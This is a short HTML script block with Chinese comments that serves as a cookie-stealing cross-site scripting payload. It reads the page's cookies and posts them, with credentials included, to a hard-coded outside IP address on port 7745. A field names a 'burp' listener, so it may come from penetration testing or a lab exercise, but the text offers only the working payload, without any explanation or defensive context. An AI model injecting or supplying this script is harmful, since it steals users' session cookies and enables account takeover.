<script>
(function() {
    // 获取当前页面的cookie
    var userCookies = document.cookie;

    // 构建POST请求的body部分
    var formData = new URLSearchParams();
    formData.append('header', '114514');
    formData.append('listener', 'burp');
    formData.append('content', userCookies);  // 用户的cookie作为消息内容发送

    // 发送POST请求
    fetch('http://39.101.137.200:7745/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: formData,
        credentials: 'include'  // 确保发送请求时包括认证信息（如cookies）
    })
    .then(response => response.text())
    .then(result => console.log(result))
    .catch(error => console.error('Error:', error));
})();
</script>
